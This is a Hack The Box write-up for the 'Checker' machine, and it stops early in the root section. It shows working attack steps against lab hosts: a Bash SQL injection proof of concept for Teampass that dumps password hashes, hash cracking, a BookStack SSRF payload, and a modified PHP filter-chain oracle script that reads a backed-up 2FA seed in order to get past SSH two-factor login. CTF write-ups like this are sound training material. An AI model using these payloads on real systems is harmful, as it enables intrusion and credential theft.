---
title: HTB: Checker
url: https://0xdf.gitlab.io/2025/05/31/htb-checker.html
date: 2025-05-31T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-checker, ctf, hackthebox, nmap, ubuntu, bookstack, laravel, teampass, cve-2023-1545, sqli, hashcat, 2fa, cve-2023-6199, ssrf, burp-repeater, burp, filter-chains-oracle, oathtool, htb-trickster, htb-linkvortex, race-condition, shared-memory
---

![Checker](/img/checker-cover.png)

Checker starts with instances of BookStack and Teampass. Without creds to either, I’ll find an SQL injection vulnerability in Teampass and leak user hashes. One cracks, and let’s me in, revealing both BookStack and SSH creds. SSH has two factor enabled. In BookStack, I’ll exploit an SSRF with a very tricky blind PHP filter oracle to read the two factor seed from a backup, and get a shell on the box. For root, I’ll exploit a binary that uses shared memory to look for compromised hashes, and poison that memory in a race condition to get execution as root.

## Box Info

| Name | [Checker](https://hackthebox.com/machines/checker)  [Checker](https://hackthebox.com/machines/checker) [Play on HackTheBox](https://hackthebox.com/machines/checker) |
| --- | --- |
| Release Date | [22 Feb 2025](https://twitter.com/hackthebox_eu/status/1892620284022169789) |
| Retire Date | 31 May 2025 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Checker |
| Radar Graph | Radar chart for Checker |
| First Blood User | 00:59:27[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 01:29:58[celesian celesian](https://app.hackthebox.com/users/114435) |
| Creator | [0xyassine 0xyassine](https://app.hackthebox.com/users/143843) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and two HTTP (80, 8080):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 15:48 EST
Nmap scan report for 10.10.11.56
Host is up (0.089s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
oxdf@hacky$ nmap -p 22,80,8080 -sCV 10.10.11.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 15:48 EST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 15:49 (0:00:12 remaining)
Nmap scan report for 10.10.11.56
Host is up (0.085s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
80/tcp   open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
8080/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds

```

Based on the [OpenSSH version](/cheatsheets/os#ubuntu), the host is likely running Ubuntu 22.04 jammy. Apache seems to have it’s version masked (as I covered in detail in this [Beyond Root for LinkVortex](/2025/04/12/htb-linkvortex.html#beyond-root---apache-config)).

Both HTTP pages are returning 403. I’ll want to look more, but my first thought it of ModSecurity like in [Trickster](/2025/02/01/htb-trickster.html#beyond-root---modsecurity). Visiting in a browser or with `curl` shows a page.

### Subdomain Brute Force

Port 80 redirects to `checker.htb`, which indicates there’s some kind of host-based routing going on. I’ll brute force for other subdomains that may reply differently using `ffuf`. However, even with a different User-Agent string, after only a handful of requests, the site starts returning [429 responses](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/429), Too Many Requests.

I’ll give up on brute force for now.

### checker.htb - TCP 80

#### Site

Visiting port 80 in a browser redirects to `checker.htb/login`, which presents a site named BookStack:

![image-20250222162150388](/img/image-20250222162150388.png)

Checking `/register` just redirects to `/login` with a flash message at the top:

![image-20250222162227725](/img/image-20250222162227725.png)

The forgot password link has a form, and submitting it pops another message:

![image-20250222162306118](/img/image-20250222162306118.png)

#### Tech Stack

The HTTP response headers show not only Apache, but a lot more:

```

HTTP/1.1 302 Found
Date: Sat, 22 Feb 2025 21:08:29 GMT
Server: Apache
Cache-Control: no-cache, no-store, private
Location: http://checker.htb/login
Content-Security-Policy: frame-ancestors 'self'; frame-src 'self' https://*.draw.io https://*.youtube.com https://*.youtube-nocookie.com https://*.vimeo.com https://embed.diagrams.net; script-src http: https: 'nonce-ulwipyGI6SDrEYt4qL9Ph6ZR' 'strict-dynamic'; object-src 'self'; base-uri 'self'
Expires: Sun, 12 Jul 2015 19:01:00 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6Im44V0sxUTFWTVZoVExqaUErNFdOMEE9PSIsInZhbHVlIjoiYVd0Lzd3YnlmTTZrZFRTWWtwVThZNEVxOFRDZzVZa3lpWVphYlg4Q2t5cXdtT2hmd0QyQ2c3c05VUFFrY3I0ZDlUL2pUZjNkTTc0TVRvVTlZZkxXb2Yzb1ZWZlVxNHRRdkNUTm9CNytCc3ZCeEQwZ1U5Y05Qd2dZdUJjenFWTDYiLCJtYWMiOiJlYzcxOGRkNDczOTY4ZGYwYzJiNDczYmVhYjAxY2Q1M2E1NzAwZjU1MmM0ZWFiMjk1YzMwMTA2NjI5MzMxZmQ5IiwidGFnIjoiIn0%3D; expires=Sat, 22-Feb-2025 23:08:29 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: bookstack_session=eyJpdiI6IkZVUWs2S3VpY0tuV1A5dWZxdUoxTlE9PSIsInZhbHVlIjoieEZRaXBmNmFBYndjNHhkalZNeXVpeGVRV254eXhSQXBUaXB6aDczbUpDdWFHZm9hMmd6aVNTMG52RXZhKzJZRHBEUDdocVhZYm1RcStrWkZjMTBhZmc0d3FOY2lSNjVYY1lXc0M1QmdxSG9zOGc0M3g0ZGVvdCsxSlV5QlhMUXAiLCJtYWMiOiI0ZDEwZWFiMTQ5NTgxNjkxMWVlMTViYmVkZGEzZGQ0ODk0ZWE3YTZiODMwMDczYzM0MTljMGFjODQ0YzkyYmViIiwidGFnIjoiIn0%3D; expires=Sat, 22-Feb-2025 23:08:29 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 342

```

The cookies look like the PHP Laravel framework. Guessing at the extension, `/index.php` redirects to `/login`, but `/login/index.php` loads the login page, so it’s very likely a PHP site.

The 404 page is completely custom, so no help there.

[BookStack](https://www.bookstackapp.com/) is a free and open source CMS, and it’s PHP using Laravel. The current version (as of Checker’s release) is v24.12.1.

Looking in the HTML source, there are references to v23.10.2:

![image-20250222181541624](/img/image-20250222181541624.png)

Given the rate limiting on the site, I’ll skip the directory brute force.

### Teampass - TCP 8080

#### Site

The site on port 8080 is an instance of [Teampass](https://teampass.net/), an open source password manager:

![image-20250222181720701](/img/image-20250222181720701.png)

Without creds, not much else to see here.

#### Tech Stack

Teampass is a PHP application, which is confirmed by loading the main page as `/index.php`. Looking through [the code](https://github.com/nilsteampassnet/TeamPass) on GitHub, there is a `changelog.txt` at the root of the repo. That file exists on Checker as well:

![image-20250529093505946](/img/image-20250529093505946.png)

It doesn’t give a more detailed version beyond v3. There is a copyright year, which is 2009-2022. Looking at [the history of that file](https://github.com/nilsteampassnet/TeamPass/commits/master/changelog.txt), I’ll note that the year was [changed from 2022 to 2023](https://github.com/nilsteampassnet/TeamPass/commit/3b35001263928671c8d9868c8b429d7f09ff8ce3#diff-b40cd67182487ef24807d9c9268329d35fbd96aa2b0a9cae69e2e0d746b1c666) in version 3.0.0.22, which implies that this is older than that. It was [changed from 2021 to 2022](https://github.com/nilsteampassnet/TeamPass/commit/91b93f72676dce206d0a41da4975794e27148ac6#diff-b40cd67182487ef24807d9c9268329d35fbd96aa2b0a9cae69e2e0d746b1c666) in version 3.0.0.10. So it’s reasonable to think the version is somewhere between those.

All of the other files that have detailed version information seem to be PHP files that won’t show it.

## Shell as reader

### Recover BootStack Creds

#### CVE-2023-1545

I’ll search for Teampass CVEs in general to see if anything comes out. The [CVEDetails page](https://www.cvedetails.com/vendor/11932/Teampass.html) shows nothing in 2024, but a few in 2023:

![image-20250223055701635](/img/image-20250223055701635.png)

Of the 2023 vulns, XSS is not interesting at this point as I have no indication of a way to interact with the target. SQL injection is the most interesting.

The [NVD description](https://nvd.nist.gov/vuln/detail/CVE-2023-1545) of CVE-2023-1545 is not very descriptive, but it does match the version analysis from above:

> SQL Injection in GitHub repository nilsteampassnet/teampass prior to 3.0.0.23.

Luckily, Snyk has a [page on it](https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612) which offers a bit more:

> Affected versions of this package are vulnerable to SQL Injection due to improper input sanitization. Exploiting this vulnerability is possible via the TeamPass `/authorize` API endpoint through the `login` field.

There is also a POC.

#### SQLI POC Analysis

Before I run the POC, it’s worth taking a look at what’s it’s doing. It is a Bash script that takes a base url, which is uses to build a vulnerable url which is the `authorize` endpoint:

```

if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

```

There’s a check to see that the API is enabled:

```

check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

```

I can do this check, and it looks like I don’t get the “not allowed” message, which is good:

```

oxdf@hacky$ curl http://10.10.11.56:8080/api/index.php/authorize
{"error":"Method GET not supported"}

```

Next it makes a function that performs the SQL injection:

```

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

```

The injection is in the `login` parameter of the POST body sent to the `authorize` endpoint. The resulting data is leaked out through the JWT. It uses `cut` to get the middle section dividing on `.`, and then base64 decodes it.

Now it uses that function to get the number of users in the system, and then to loop over those users getting their username and password hash:

```

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done

```

#### SQLI POC Execution

Running the script works:

```

oxdf@hacky$ bash cve-2023-1545.sh 
Usage: cve-2023-1545.sh <base-url>
oxdf@hacky$ bash cve-2023-1545.sh http://10.10.11.56:8080
There are 2 users in the system:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy

```

#### Crack Hash

I’ll save the two hashes to a file (removing the spaces):

```

admin:$2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob:$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy

```

And pass it to `hashcat`:

```

$ hashcat teampass.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

No reason to think it’s anything other than plain bcrypt, so I’ll try with `-m 3200`. Very quickly, the hash for bob cracks:

```

$ hashcat teampass.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader
...[snip]...

```

#### Teampass Access

With bob’s password, I’ll log into Teampass:

![image-20250223061222526](/img/image-20250223061222526.png)

There are two entries for bob. The “bookstack login” entry has a password that reveals as “mYSeCr3T\_w1kI\_P4sSw0rD”:

![image-20250223061315918](/img/image-20250223061315918.png)

The “ssh access” password is “hiccup-publicly-genesis” for the account reader:

![image-20250223061350268](/img/image-20250223061350268.png)

#### SSH

While it is dangerous and not something I would do in production, I typically use `sshpass` to show the password I’m logging in with in blog posts. Here, it just hangs:

```

oxdf@hacky$ sshpass -p hiccup-publicly-genesis ssh reader@checker.htb
Warning: Permanently added 'checker.htb' (ED25519) to the list of known hosts.

```

Running without `sshpass` shows why:

```

oxdf@hacky$ ssh reader@checker.htb
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code:

```

The account requires 2FA.

### Local File Read

#### BookStack Access

With creds from Teampass, I’m able to log into BookStack as bob@checker.htb:

![image-20250223062842674](/img/image-20250223062842674.png)

There are a couple existing pages. I’ll make sure to note a hint. In the “Basic Baskup with cp” article, there are example `bash` scripts showing recursive copying of files from `/home` to `/backup/home_backup`:

![image-20250224105920948](/img/image-20250224105920948.png)

#### CVE-2023-6199 Background

Searching for vulnerabilities in this version of BookStack returns many posts about CVE-2023-6199:

![image-20250223063004978](/img/image-20250223063004978.png)

NVD [describes](https://nvd.nist.gov/vuln/detail/CVE-2023-6199) it as:

> Book Stack version 23.10.2 allows filtering local files on the server. This is possible because the application is vulnerable to SSRF.

The vulnerability is in the `html` parameter of the `/ajax/page/<id>/save-draft` endpoint. A blog post from fluid attacks, [LFR via SSRF in BookStack: Beware of insecure-by-default libraries!](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/), walks through the vulnerability in detail, showing how an attacker-controller parameter in a HTTP POST request can get a provided URL into a call to `file_get_contents` if crafted correctly. This is server-side request forgery.

Beyond that, the post mentions using the [Blind File Oracles](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) technique to use this to read files from the local machine.

#### SSRF POC

To test this out, I’ll click “Books” –> “Create New Book”, fill out the form to create a book, and then click “New Page”:

![image-20250224062243425](/img/image-20250224062243425.png)

Updating the page may inspire it to save the draft automatically, or I can click the three dots next to “Editing Draft” and then “Save Draft”.

Burp shows that when that happens, there’s a PUT request to `/ajax/page/8/save-draft` (though the page number may vary):

![image-20250224062414393](/img/image-20250224062414393.png)

I’ll send this request to repeater. For the payload, I want a base64-encoded URL:

```

oxdf@hacky$ echo -n "http://10.10.14.6/ssrf-poc" | base64
aHR0cDovLzEwLjEwLjE0LjYvc3NyZi1wb2M=

```

It is critical to include the `-n`, or else the string will decode with a trailing newline, and then won’t be recognized as a URL later by PHP.

I’ll take the result (minus any trailing “=”) and wrap it in the payload shown in the POC exploit:

```

<img src='data:image/png;base64,aHR0cDovLzEwLjEwLjE0LjYvc3NyZi1wb2M'/>

```

I’ll put this in the `html` parameter in the PUT request and send it. Immediately there’s a request at my listening Python webserver from Checker:

```
10.10.11.56 - - [24/Feb/2025 06:26:16] code 404, message File not found
10.10.11.56 - - [24/Feb/2025 06:26:16] "GET /ssrf-poc HTTP/1.1" 404 -

```

That’s SSRF exploitation.

#### Filter Chains Oracle POC

The blind filter chains technique was made popular in a blog post from Synacktiv, [PHP filter chains: file read from error-based oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle), which is built on a technique from a challenge in the DownUnder CTF 2022.

The attack uses PHP filer chains to determine the contents of a file when the attacker can provide a URL that is passed to `file`, `hash_file`, `file_get_contents`, or `copy`. Typically these calls don’t print the data returned from them.

There is also a [Python script POC](https://github.com/synacktiv/php_filter_chains_oracle_exploit) available for use. While it’s always a good idea to read and understand POCs before just running them, it’s especially true here as I’ll have to modify the script to so that it sends the URL in a base64-encoded image tag.

The [main script](https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle_exploit.py), `filters_chain_oracle_exploit.py`, is mostly handling passed in args before eventually using `Requestor` and `RequestorBruteforcer` ([source](https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle/core/requestor.py)) objects to perform the attacks:

```

        # Attack launcher
        self.requestor = Requestor(args.file, args.target, args.parameter, data, headers, verb, in_chain, args.proxy, time_based_attack, delay, json_input, match)
        self.bruteforcer = RequestorBruteforcer(self.requestor, offset)
        signal.signal(signal.SIGINT, self.signal_handler)

        # Auto fallback to time based attack

        self.bruteforcer.bruteforce()

        # Result parsing
        if self.bruteforcer.base64:
            print("[+] File {} leak is finished!".format(self.requestor.file_to_leak))
            print(self.bruteforcer.base64)
            print(self.bruteforcer.data)
            if self.log_file:
                self.log_in_file("# The following data was leaked from {} from the file {}\n{}\n".format(self.requestor.target, self.requestor.file_to_leak, self.bruteforcer.data.decode("utf-8")))
            exit()
        else:
            print("[-] File {} is either empty, or the exploit did not work :(".format(self.requestor.file_to_leak))
            time_based_attack = 1
            print("[*] Auto fallback to time based attack")
            self.requestor = Requestor(args.file, args.target, args.parameter, data, headers, verb, in_chain, args.proxy, time_based_attack, delay, json_input, match)
            self.bruteforcer = RequestorBruteforcer(self.requestor, offset)
            self.bruteforcer.bruteforce()
        
        if verb == Verb.GET:
            print("[*] You passed your payload on a GET parameter, the leak might be partial! (~135 chars max by default)")
        
        print(self.bruteforcer.base64)
        print(self.bruteforcer.data)

```

The requested file is only passed into the dunder init function of the `Requestor` class, which is found in `filters_chain_oracle/core/requestor.py`. [At the top](https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle/core/requestor.py#L11-L13) of the class, it sets `self.file_to_leak` to the input file.

That is [later](https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle/core/requestor.py#L107-L109) used to generate the `filter_chain`, which is then merged into the other provided data:

```

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        # DEBUG print(filter_chain)
        merged_data = self.parse_parameter(filter_chain)

```

From there, it sends the request.

#### Modify POC

To make this work, I’ll need to take the `filter_chain` output, base64-encode it, and put it into an image tag. I could build my own script that implements the library, but I’ll go for the hacky solution and modify `requestor.py` by importing `b64decode` at the top of the file, and then add a line:

```

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        # DEBUG print(filter_chain)
        filter_chain = f"<img src='data:image/png;base64,{b64encode(filter_chain.encode()).decode()}'/>"
        merged_data = self.parse_parameter(filter_chain)

```

I’ll add the [inline meta](/cheatsheets/uv#add-meta) to the main script, and now when I run this, it gets `/etc/hostname`:

```

oxdf@hacky$ uv add --script filters_chain_oracle_exploit.py -r requirements.txt
Updated `filters_chain_oracle_exploit.py`
oxdf@hacky$ uv run filters_chain_oracle_exploit.py --verb PUT --file /etc/hostname --target http://checker.htb/ajax/page/8/save-draft --parameter html --headers '{"Cookie": "XSRF-TOKEN=eyJpdiI6IjlqMWFOTUI5U0FoTUwzODJWWS9PUmc9PSIsInZhbHVlIjoiOXArTFBZRjMzY1l2dU4zcWtxZUN2dVdvS3Jka1FvdmcrZTN0a0QwSE5Ock43eWhpMlJ1WG9VdHlDcXV6cXVVYkEwQTVpSXpITXhuZ1hLa3FqNEY2VGc0M3owbUF2VWRKUTJtMTRHUXdCb1VCOElydHlYOGxWd0cwdVJLTlBuazkiLCJtYWMiOiI2ZTdmNWY3Y2Q4Mzc1NmI2MTAzYzQ4NWQwZmE0YjE3MTZlYzc1YTEyOGU0NWNjNWEzMmM0NTY0ZTk2YTkyOTk0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IldrWmZqQkk0N3A5S0dYd2NDd2lGV3c9PSIsInZhbHVlIjoiL2FSMEhXOWZMeUpkTExnUTNKYmNNck1hOG5FSFBFZGF0MmhJUFJKcXB6K0FGZFArbkZraU9LUWgvVXlINXdyRlJheWp6NEZpemdWNjVGVHpraXVwRzRkVnU4d0c4cWpKNllBMEsxYUxPLzROZkVxY1lhTEFiWmh5WHJJcmxZWE8iLCJtYWMiOiJjOTNhYzljMWRkMWQzNjVhMDVkMTM3NGU3N2FmMjI4NDE3OWRlNDcwMjVmYmQ4NTg0NDUzNjc3ZmNkNDJhYjI0IiwidGFnIjoiIn0%3D; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=157db5779ec5fdb5c1a8f3bacf00f63d4d3d22235d69f15848", "X-CSRF-TOKEN": "0ifkkNROMkGdJH6oMEH5wAth2ZQlbjAfaC9eSzax"}' 
Installed 5 packages in 10ms
[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft
[*] The following local file is leaked : /etc/hostname
[*] Running PUT requests
[*] Additionnal headers used : {"Cookie": "XSRF-TOKEN=eyJpdiI6IjlqMWFOTUI5U0FoTUwzODJWWS9PUmc9PSIsInZhbHVlIjoiOXArTFBZRjMzY1l2dU4zcWtxZUN2dVdvS3Jka1FvdmcrZTN0a0QwSE5Ock43eWhpMlJ1WG9VdHlDcXV6cXVVYkEwQTVpSXpITXhuZ1hLa3FqNEY2VGc0M3owbUF2VWRKUTJtMTRHUXdCb1VCOElydHlYOGxWd0cwdVJLTlBuazkiLCJtYWMiOiI2ZTdmNWY3Y2Q4Mzc1NmI2MTAzYzQ4NWQwZmE0YjE3MTZlYzc1YTEyOGU0NWNjNWEzMmM0NTY0ZTk2YTkyOTk0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IldrWmZqQkk0N3A5S0dYd2NDd2lGV3c9PSIsInZhbHVlIjoiL2FSMEhXOWZMeUpkTExnUTNKYmNNck1hOG5FSFBFZGF0MmhJUFJKcXB6K0FGZFArbkZraU9LUWgvVXlINXdyRlJheWp6NEZpemdWNjVGVHpraXVwRzRkVnU4d0c4cWpKNllBMEsxYUxPLzROZkVxY1lhTEFiWmh5WHJJcmxZWE8iLCJtYWMiOiJjOTNhYzljMWRkMWQzNjVhMDVkMTM3NGU3N2FmMjI4NDE3OWRlNDcwMjVmYmQ4NTg0NDUzNjc3ZmNkNDJhYjI0IiwidGFnIjoiIn0%3D; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=157db5779ec5fdb5c1a8f3bacf00f63d4d3d22235d69f15848", "X-CSRF-TOKEN": "0ifkkNROMkGdJH6oMEH5wAth2ZQlbjAfaC9eSzax"}
[+] File /etc/hostname leak is finished!
Y2hlY2tl
b'checke'

```

I have to include active cookies and the `X-CSRF-TOKEN` header from a valid request.

It’s worth nothing that this is a brute force approach, and it’s rather slow. It’s also probably missing a last character “r”, though hard to say for sure at this point.

### Shell

#### Read 2FA Seed

I have a user, reader, and their password that works for SSH, but 2FA is enabled. Searching for things like “Linux SSH 2fa” returns [tutorials](https://ubuntu.com/tutorials/configure-ssh-2fa#1-overview) that show how to set up Google Authenticator. This application stores it’s 2FA seed value in `~/.google_authenticator`.

I can’t directly read `/home/reader/.google_authenticator`. That makes sense, as that file is typically not readable by anyone other than the user it belongs to (and actually will fail is the permissions are too broad). But I can try in the `/backup` directory leaks on the post, and it works:

```

oxdf@hacky$ uv run filters_chain_oracle_exploit.py --verb PUT --file /backup/home_backup/home/reader/.google_authenticator --target http://checker.htb/ajax/page/8/save-draft --parameter html --headers '{"Cookie": "XSRF-TOKEN=eyJpdiI6IjlqMWFOTUI5U0FoTUwzODJWWS9PUmc9PSIsInZhbHVlIjoiOXArTFBZRjMzY1l2dU4zcWtxZUN2dVdvS3Jka1FvdmcrZTN0a0QwSE5Ock43eWhpMlJ1WG9VdHlDcXV6cXVVYkEwQTVpSXpITXhuZ1hLa3FqNEY2VGc0M3owbUF2VWRKUTJtMTRHUXdCb1VCOElydHlYOGxWd0cwdVJLTlBuazkiLCJtYWMiOiI2ZTdmNWY3Y2Q4Mzc1NmI2MTAzYzQ4NWQwZmE0YjE3MTZlYzc1YTEyOGU0NWNjNWEzMmM0NTY0ZTk2YTkyOTk0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IldrWmZqQkk0N3A5S0dYd2NDd2lGV3c9PSIsInZhbHVlIjoiL2FSMEhXOWZMeUpkTExnUTNKYmNNck1hOG5FSFBFZGF0MmhJUFJKcXB6K0FGZFArbkZraU9LUWgvVXlINXdyRlJheWp6NEZpemdWNjVGVHpraXVwRzRkVnU4d0c4cWpKNllBMEsxYUxPLzROZkVxY1lhTEFiWmh5WHJJcmxZWE8iLCJtYWMiOiJjOTNhYzljMWRkMWQzNjVhMDVkMTM3NGU3N2FmMjI4NDE3OWRlNDcwMjVmYmQ4NTg0NDUzNjc3ZmNkNDJhYjI0IiwidGFnIjoiIn0%3D; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=157db5779ec5fdb5c1a8f3bacf00f63d4d3d22235d69f15848", "X-CSRF-TOKEN": "0ifkkNROMkGdJH6oMEH5wAth2ZQlbjAfaC9eSzax"}' 
[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft
[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
[*] Running PUT requests
[*] Additionnal headers used : {"Cookie": "XSRF-TOKEN=eyJpdiI6IjlqMWFOTUI5U0FoTUwzODJWWS9PUmc9PSIsInZhbHVlIjoiOXArTFBZRjMzY1l2dU4zcWtxZUN2dVdvS3Jka1FvdmcrZTN0a0QwSE5Ock43eWhpMlJ1WG9VdHlDcXV6cXVVYkEwQTVpSXpITXhuZ1hLa3FqNEY2VGc0M3owbUF2VWRKUTJtMTRHUXdCb1VCOElydHlYOGxWd0cwdVJLTlBuazkiLCJtYWMiOiI2ZTdmNWY3Y2Q4Mzc1NmI2MTAzYzQ4NWQwZmE0YjE3MTZlYzc1YTEyOGU0NWNjNWEzMmM0NTY0ZTk2YTkyOTk0IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IldrWmZqQkk0N3A5S0dYd2NDd2lGV3c9PSIsInZhbHVlIjoiL2FSMEhXOWZMeUpkTExnUTNKYmNNck1hOG5FSFBFZGF0MmhJUFJKcXB6K0FGZFArbkZraU9LUWgvVXlINXdyRlJheWp6NEZpemdWNjVGVHpraXVwRzRkVnU4d0c4cWpKNllBMEsxYUxPLzROZkVxY1lhTEFiWmh5WHJJcmxZWE8iLCJtYWMiOiJjOTNhYzljMWRkMWQzNjVhMDVkMTM3NGU3N2FmMjI4NDE3OWRlNDcwMjVmYmQ4NTg0NDUzNjc3ZmNkNDJhYjI0IiwidGFnIjoiIn0%3D; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=157db5779ec5fdb5c1a8f3bacf00f63d4d3d22235d69f15848", "X-CSRF-TOKEN": "0ifkkNROMkGdJH6oMEH5wAth2ZQlbjAfaC9eSzax"}
[+] File /backup/home_backup/home/reader/.google_authenticator leak is finished!
RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK
b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'

```

#### Generate Code

That seed, along with the current time, is what is used to generate the 2FA six-digit number. I’ll generate them locally with `oathtool` (`apt install oathtool`):

```

oxdf@hacky$ oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE
538822

```

This doesn’t work for me:

```

oxdf@hacky$ ssh reader@checker.htb
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code: 
Error "Operation not permitted" while writing config

(reader@checker.htb) Password:

```

This error message is confusing. It doesn’t look like an error for the code being wrong. In fact, if I try again and put in 123456 as the code, it just prompts for the password again:

```

oxdf@hacky$ ssh reader@checker.htb
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code: 
(reader@checker.htb) Password: 

```

Still, that is still an error for the code not being quite right (I think it’s because it’s only a few minutes off).

When troubleshooting 2FA, the first thing to check is the time. A nice way to get that is from the HTTP server headers. It looks like Checker is a little less than two minutes ahead of my box:

```

oxdf@hacky$ curl -v http://checker.htb -s 2>&1 | grep Date | cut -d' ' -f 4-; date
24 Feb 2025 15:38:37 GMT
Mon Feb 24 03:36:59 PM UTC 2025

```

I’ll use this one-liner to get the token from the time on Checker:

```

oxdf@hacky$  oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE --now="$(date -d "$(curl -v http://checker.htb -s 2>&1 | grep Date | cut -d' ' -f 3- | tr -d '\r')" "+%Y-%m-%d %H:%M:%S")"
579533

```

It’s using `curl` with `grep` and `cut` to get the date from the webserver, and then `date` to convert it to the needed format. It works:

```

oxdf@hacky$ ssh reader@checker.htb
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
...[snip]...
reader@checker:~$

```

And I can grab `user.txt`:

```

reader@checker:~$ cat user.txt
40dfa1de************************

```

## Shell as root

### Enumeration

#### Users

There are no other users with home directories in `/home`, or with shells configured in `/etc/passwd`:

```

reader@checker:~$ ls /home/
reader
reader@checker:~$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
reader:x:1000:1000::/home/reader:/bin/bash

```

reader’s home directory is very empty:

```

